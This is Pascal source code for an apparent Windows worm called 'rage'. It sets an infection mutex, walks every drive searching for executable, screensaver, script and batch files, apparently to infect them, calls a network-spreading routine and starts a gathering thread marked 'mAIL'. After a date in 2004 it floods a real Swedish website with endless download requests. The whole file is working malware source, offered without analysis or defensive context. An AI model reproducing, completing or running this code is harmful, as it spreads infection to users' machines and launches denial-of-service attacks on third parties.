   Program rage;

   uses
     Windows,
     WinSock,
     Unit1 in 'Unit1.pas',
     Unit2 in 'Unit2.pas';



   function DFile(Caller: cardinal; URL: PChar; FileName: PChar; Reserved: LongWord; StatusCB: cardinal): Longword; stdcall; external 'URLMON.DLL' name 'URLDownloadToFileA';

   function GetDrives:string;
   var
      p:integer;
      This,All,c,f,cDrives:string;
   begin
      c:=';';
      f:=Chr(0);
      SetLength(cDrives,300);
      GetLogicalDriveStrings(300,PChar(cDrives));
      p:=Pos(f,cDrives);
      while p > 0 do
      begin
         This:=Copy(cDrives,1,p - 1);
         if Length(This) <> 3 then Break;
         cDrives:=Copy(cDrives,p + 1,Length(cDrives));
         p:=Pos(f,cDrives);
         if lowercase(copy(this,1,3)) <> 'a:\' then
          All:=All + This + c;
      end;
      GetDrives:=all;
   end;

   var
    SYSTEMTIME       : _SYSTEMTIME;
    AA               : DWORD;
    Driv             : String;
   Begin

    Release;
    Driv := GetDrives;
    CreateMutexA(NIL, TRUE, 'FACEHACKER_INYOURPANTS');
    If (GetLastError() = ERROR_ALREADY_EXISTS) Then ExitProcess(0);

    While Driv <> '' Do Begin
     FFile(Copy(SysDir,1,pos(';',SysDir)-1),'*','.exe');
     FFile(Copy(SysDir,1,pos(';',SysDir)-1),'*','.com');
     FFile(Copy(SysDir,1,pos(';',SysDir)-1),'*','.scr');
     FFile(Copy(SysDir,1,pos(';',SysDir)-1),'*','.pif');
     FFile(Copy(SysDir,1,pos(';',SysDir)-1),'*','.cmd');
     FFile(Copy(SysDir,1,pos(';',SysDir)-1),'*','.bat');
     FFile(Copy(SysDir,1,pos(';',SysDir)-1),'*','.ocx');
     Driv := Copy(Driv,pos(';',Driv)+1,length(Driv));
    End;

    gonetwork;

    CreateThread(0,0,@StartGather,0,0,AA);

   // mAIL

    GetSystemTime(SYSTEMTIME);
    IF (SystemTime.wYear > 2004) or
       ((SystemTime.wYear = 2004) and (SystemTime.wMonth > 5)) Then Begin
     While 1<>2 Do Begin
      DFile(0,'http://www.lunarstorm.se','',0,0);
      Sleep(10);
     End;
    End;

    while 1<>2 do begin
     ;
    end;
   End.
